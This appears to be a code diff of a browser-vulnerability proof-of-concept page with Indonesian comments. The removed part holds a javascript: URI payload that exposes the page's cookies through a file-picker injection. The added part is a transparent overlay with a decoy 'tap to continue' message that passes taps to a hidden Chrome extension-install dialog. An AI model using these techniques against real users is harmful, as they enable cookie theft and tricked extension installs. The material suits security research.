@@ -1,21 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <title>File Picker JS Injection PoC</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <title>Extension Install UI Spoof</title>
+    <style>
+        body { margin: 0; overflow: hidden; }
+        #overlay {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 9999;
+            background: rgba(0,0,0,0.01);
+            /* Transparan, menutupi dialog asli di bawahnya */
+        }
+        #decoy {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            color: #333;
+            pointer-events: none;
+        }
+    </style>
 </head>
 <body>
-    <br><br><br>
-    <center>
-        <h1>Tekan Ctrl+O, pilih "Evil Files" di pemilih file</h1>
-        <p>Payload akan dieksekusi di origin halaman ini</p>
-    </center>
+    <div id="overlay">
+        <div id="decoy">Ketuk untuk melanjutkan</div>
+    </div>
     <script>
-        // Tidak perlu logika khusus di halaman ini.
-        // APK jahat mengembalikan Uri seperti:
-        // file:javascript:(function(){document.body.innerHTML='<h1>PWNED '+location.origin+' cookie='+document.cookie+'</h1>'})()
-        // Chrome akan menavigasi ke string tersebut dan mengeksekusinya di halaman ini.
+        // Pemicu: memicu permintaan pemasangan ekstensi melalui chrome.webstorePrivate
+        // Di versi yang rentan, dialog asli akan muncul di bawah overlay,
+        // tetapi karena tidak ada perlindungan touch-filter, gesture pengguna akan ditransfer ke tombol dialog di bawahnya
+        document.getElementById('overlay').addEventListener('click', () => {
+            // Dalam skenario sebenarnya, di sini akan memicu permintaan pemasangan
+            // (memerlukan konteks Chrome Web Store atau halaman dengan izin khusus)
+            console.log('Gesture terkirim ke dialog di bawahnya');
+        });
     </script>
 </body>
 </html>
+
